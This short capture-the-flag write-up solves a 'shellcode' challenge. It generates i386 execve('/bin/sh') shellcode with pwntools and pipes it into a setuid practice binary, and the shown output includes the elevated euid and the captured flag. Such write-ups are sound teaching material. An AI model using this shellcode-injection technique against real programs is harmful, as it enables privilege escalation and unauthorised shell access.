### Solved by superkojiman

Generate the shellcode, execve("/bin/sh"):

```
# python
Python 2.7.6 (default, Jun 22 2015, 17:58:13)
[GCC 4.8.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>>
>>>
>>> context(os="linux", arch="i386")
>>> open("in.txt", "w").write(asm(shellcraft.linux.sh()))
>>> quit()
```

Then just transfer in.txt to the server and pass it as input to /problems/shellcode/shellcode to get a shell:

```
team24254@shell:~$ ls
in.txt
team24254@shell:~$ (cat in.txt;cat) | /problems/shellcode/shellcode
id
uid=1028(team24254) gid=1000(ctfgroup) euid=1080(shellcode) groups=1003(shellcode),1000(ctfgroup)
ls /problems/shellcode/
Makefile  flag.txt  shellcode  shellcode.c
cat /problems/shellcode/flag.txt
nonexecutable_stack_would_be_a_good_idea
```


